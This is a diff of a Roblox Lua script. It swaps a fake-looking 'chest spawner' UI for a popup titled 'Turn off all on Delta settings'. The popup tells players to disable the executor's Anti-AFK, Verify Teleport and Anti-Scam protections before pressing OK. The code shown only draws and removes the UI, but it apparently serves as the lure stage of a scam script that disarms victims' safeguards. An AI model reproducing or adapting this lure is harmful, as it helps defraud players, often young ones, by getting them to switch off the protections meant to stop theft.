@@ -1,58 +1,70 @@
--- TOCHIPYRO UI Script
-
 -- Create ScreenGui
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "TOCHIPYRO"
+screenGui.Name = "DeltaWarningUI"
+screenGui.ResetOnSpawn = false
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
 -- Main Frame
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 300, 0, 150)
-mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
-mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-mainFrame.BorderSizePixel = 0
-mainFrame.Parent = screenGui
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 400, 0, 220)
+frame.Position = UDim2.new(0.5, -200, 0.5, -110)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
 
--- Title
+-- UICorner for round edges
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = frame
+
+-- Title Text
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 40)
+title.Size = UDim2.new(1, -20, 0, 40)
+title.Position = UDim2.new(0, 10, 0, 10)
 title.BackgroundTransparency = 1
-title.Text = "SKYROOT CHEST SPAWNER"
-title.TextColor3 = Color3.fromRGB(0, 255, 127)
-title.TextScaled = true
-title.Font = Enum.Font.SourceSansBold
-title.Parent = mainFrame
+title.Text = "⚠️ Turn off all on Delta settings ⚠️"
+title.TextColor3 = Color3.fromRGB(255, 0, 0)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.Parent = frame
 
--- TextBox (Input)
-local textBox = Instance.new("TextBox")
-textBox.Size = UDim2.new(1, -20, 0, 40)
-textBox.Position = UDim2.new(0, 10, 0, 50)
-textBox.PlaceholderText = "Enter Name"
-textBox.Text = ""
-textBox.TextScaled = true
-textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-textBox.Font = Enum.Font.SourceSans
-textBox.Parent = mainFrame
+-- Instruction Text
+local instructions = Instance.new("TextLabel")
+instructions.Size = UDim2.new(1, -20, 0, 100)
+instructions.Position = UDim2.new(0, 10, 0, 50)
+instructions.BackgroundTransparency = 1
+instructions.TextXAlignment = Enum.TextXAlignment.Left
+instructions.TextYAlignment = Enum.TextYAlignment.Top
+instructions.Text = [[
+1. Disable Anti-AFK
+2. Disable Verify Teleport
+3. Disable Anti-Scam
 
--- Spawn Button
-local spawnBtn = Instance.new("TextButton")
-spawnBtn.Size = UDim2.new(1, -20, 0, 40)
-spawnBtn.Position = UDim2.new(0, 10, 0, 100)
-spawnBtn.Text = "SPAWN"
-spawnBtn.TextScaled = true
-spawnBtn.Font = Enum.Font.SourceSansBold
-spawnBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
-spawnBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
-spawnBtn.Parent = mainFrame
+✅ After disabling, press OK to continue.
+]]
+instructions.TextColor3 = Color3.fromRGB(255, 255, 255)
+instructions.Font = Enum.Font.Gotham
+instructions.TextSize = 16
+instructions.Parent = frame
 
--- Button Function
-spawnBtn.MouseButton1Click:Connect(function()
-    local enteredName = textBox.Text
-    if enteredName ~= "" then
-        print("Spawning chest with name: " .. enteredName)
-        -- Replace this with your actual spawn logic
-    else
-        warn("Please enter a name before spawning.")
-    end
+-- Okay Button
+local okayBtn = Instance.new("TextButton")
+okayBtn.Size = UDim2.new(0, 200, 0, 40)
+okayBtn.Position = UDim2.new(0.5, -100, 1, -60)
+okayBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+okayBtn.Text = "Okay"
+okayBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+okayBtn.Font = Enum.Font.GothamBold
+okayBtn.TextSize = 20
+okayBtn.Parent = frame
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 8)
+btnCorner.Parent = okayBtn
+
+-- Button Click -> Remove UI
+okayBtn.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
 end)
